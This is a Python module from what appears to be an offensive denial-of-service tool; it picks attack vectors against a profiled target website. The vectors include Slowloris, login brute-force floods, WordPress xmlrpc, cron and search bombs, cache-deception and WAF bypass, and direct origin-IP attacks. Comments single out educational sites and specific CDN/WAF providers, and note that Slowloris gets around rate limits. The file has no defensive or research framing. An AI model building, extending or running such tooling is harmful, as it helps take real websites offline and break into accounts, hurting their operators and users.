"""Attack vector determination builder.

Extracted from AttackProfileGenerator._determine_vectors(),
_determine_surgical_vectors(), and _determine_all_vectors() (Task 2.3).

Pure functions — take profile + needed params, return a value.
"""

from __future__ import annotations

from typing import List, Tuple

from finder.site_profile import SiteProfile
from finder.vf_tech_helpers import (
    is_spa, is_nextjs, has_graphql, is_origin_resource,
)


def determine_vectors(profile: SiteProfile, strategy: str,
                      html: str = "", verify_ssl: bool = True) -> List[str]:
    """Determine which attack vectors to use (auto mode).

    Args:
        profile: The site profile with discovered information.
        strategy: The selected attack strategy name.
        html: Optional raw HTML content for pattern matching.
        verify_ssl: Whether SSL verification is enabled.

    Returns:
        List of attack vector name strings.
    """
    p = profile
    vectors: List[str] = []
    _is_spa = is_spa(p, html)
    has_waf = bool(p.waf)
    is_edu = p.site_category == 'educational'

    if is_edu:
        vectors.append("SLOWLORIS")
        vectors.append("API_FLOOD")
        if p.edu_endpoints:
            vectors.append("EDU_API_FLOOD")
        vectors.append("COOKIE_POISON")
        vectors.append("CHUNKED_BOMB")
        if p.login_fields and p.forms:
            vectors.append("LOGIN_FLOOD")
        if _is_spa:
            vectors.append("SPA_ROUTE_FLOOD")
        if has_waf:
            vectors.append("CACHE_DECEPTION_BYPASS")
            vectors.append("SLOW_POST_READ")
        if p.cdn or p.waf:
            vectors.append("ORIGIN_IP_DIRECT")
        vectors.append("SLOW_READ")
        return vectors

    if _is_spa:
        vectors.append("API_FLOOD")
        vectors.append("SPA_ROUTE_FLOOD")
        if has_graphql(p, html):
            vectors.append("GRAPHQL_FLOOD")
        if is_nextjs(p, html):
            vectors.append("SSR_RENDER_FLOOD")
        if p.login_fields.get("username") != "username" or p.forms:
            vectors.append("LOGIN_FLOOD")
        vectors.append("SLOWLORIS")
        origin_resources = [r for r in (list(p.images) + list(p.stylesheets) + list(p.scripts))
                           if is_origin_resource(r, p)]
        if origin_resources:
            vectors.append("RESOURCE_FLOOD")
        if has_waf:
            vectors.append("SLOW_POST_READ")
            vectors.append("CACHE_DECEPTION_BYPASS")
            if "sotoon" in (p.waf or "").lower() or "arvan" in (p.waf or "").lower():
                vectors.append("HTTP2_MULTIPLEX")
    else:
        if p.login_fields.get("username") != "username" or p.forms:
            vectors.append("LOGIN_FLOOD")
        vectors.append("PAGE_FLOOD")
        if p.images or p.stylesheets or p.scripts:
            vectors.append("RESOURCE_FLOOD")
        vectors.append("SLOWLORIS")
        if p.api_endpoints:
            vectors.append("API_FLOOD")
        if p.viewstate_present:
            vectors.append("VIEWSTATE_FLOOD")
        if p.cms and "WordPress" in p.cms:
            vectors.append("WP_XMLRPC")
            vectors.append("WP_LOGIN")
            # v34: New high-amplification WordPress attack vectors
            vectors.append("WP_CRON_BOMB")    # wp-cron.php = full PHP process
            vectors.append("WP_AJAX_FLOOD")   # admin-ajax.php = always dynamic
            vectors.append("WP_REST_FLOOD")   # /wp-json/ = heavy DB queries
            vectors.append("WP_SEARCH_BOMB")  # ?s=term = LIKE full table scan
            # v34: WooCommerce detection (check technologies/plugins)
            techs = [t.get("name", "").lower() for t in (p.technologies or []) if isinstance(t, dict)]
            has_woo = any("woocommerce" in t or "woo-" in t for t in techs)
            # Also check found_paths for WooCommerce indicators
            if not has_woo and p.found_paths:
                for fp in p.found_paths:
                    path = fp.get("path", "").lower() if isinstance(fp, dict) else str(fp).lower()
                    if "woocommerce" in path or "wc-" in path or "product" in path:
                        has_woo = True
                        break
            if has_woo:
                vectors.append("WP_WOOCOMMERCE_FLOOD")

    return vectors


def determine_surgical_vectors(profile: SiteProfile,
                               html: str = "") -> Tuple[List[str], List[str]]:
    """SURGICAL mode: Only attack confirmed vulnerable points.

    Unlike the original method which stored surgical_targets in
    self._surgical_analysis (hidden mutable state), this function
    returns (vectors, surgical_targets) as a tuple.

    Args:
        profile: The site profile with discovered information.
        html: Optional raw HTML content for pattern matching.

    Returns:
        Tuple of (attack_vectors, surgical_targets) lists.
    """
    p = profile
    vectors: List[str] = []
    surgical_targets: List[str] = []

    has_login = bool(p.forms) or (p.login_fields and p.login_fields.get('username'))
    if has_login and not p.rate_limit_detected:
        vectors.append("LOGIN_FLOOD")
        surgical_targets.append("Login form + no rate limit → login brute force")
    elif has_login and p.rate_limit_detected:
        surgical_targets.append("Login form EXISTS but rate-limited → skip")

    if p.api_endpoints and len(p.api_endpoints) > 0:
        vectors.append("API_FLOOD")
        surgical_targets.append(f"API endpoints ({len(p.api_endpoints)}) found → API flood")

    if is_spa(p, html):
        vectors.append("SPA_ROUTE_FLOOD")
        surgical_targets.append("SPA detected → route flood")
        if is_nextjs(p, html):
            vectors.append("SSR_RENDER_FLOOD")
            surgical_targets.append("Next.js SSR → server render flood")

    supports_keepalive = (
        p.headers.get("Connection", "").lower() == "keep-alive" or
        p.headers.get("Keep-Alive", "") or
        p.headers.get("Server", "")
    )
    if supports_keepalive:
        vectors.append("SLOWLORIS")
        if p.rate_limit_detected:
            surgical_targets.append("Rate limit + keep-alive → slowloris BYPASSES rate limit!")
        else:
            surgical_targets.append("Keep-alive supported → slowloris for connection exhaustion")

    if p.viewstate_present:
        vectors.append("VIEWSTATE_FLOOD")
        surgical_targets.append("ASP.NET ViewState → viewstate flood")

    if p.cms and "WordPress" in (p.cms or ""):
        vectors.append("WP_XMLRPC")
        surgical_targets.append("WordPress → xmlrpc flood")

    if not vectors:
        vectors.append("PAGE_FLOOD")
        surgical_targets.append("No specific weakness found → page flood fallback")

    return vectors, surgical_targets


def determine_all_vectors(profile: SiteProfile,
                          html: str = "") -> List[str]:
    """ALL mode: Throw EVERYTHING at the target simultaneously.

    Args:
        profile: The site profile with discovered information.
        html: Optional raw HTML content for pattern matching.

    Returns:
        List of unique attack vector name strings.
    """
    p = profile
    vectors: List[str] = []

    vectors.append("LOGIN_FLOOD")
    vectors.append("PAGE_FLOOD")
    vectors.append("RESOURCE_FLOOD")
    vectors.append("SLOWLORIS")
    vectors.append("SLOW_POST_READ")

    vectors.append("API_FLOOD")
    vectors.append("SPA_ROUTE_FLOOD")

    if is_nextjs(p, html):
        vectors.append("SSR_RENDER_FLOOD")

    if has_graphql(p, html):
        vectors.append("GRAPHQL_FLOOD")

    if p.viewstate_present:
        vectors.append("VIEWSTATE_FLOOD")

    if p.cms and "WordPress" in (p.cms or ""):
        vectors.append("WP_XMLRPC")
        vectors.append("WP_LOGIN")

    vectors.append("CACHE_DECEPTION_BYPASS")
    if p.waf:
        vectors.append("HTTP2_MULTIPLEX")
        vectors.append("ORIGIN_IP_DIRECT")

    seen: set = set()
    unique_vectors: List[str] = []
    for v in vectors:
        if v not in seen:
            seen.add(v)
            unique_vectors.append(v)
    return unique_vectors
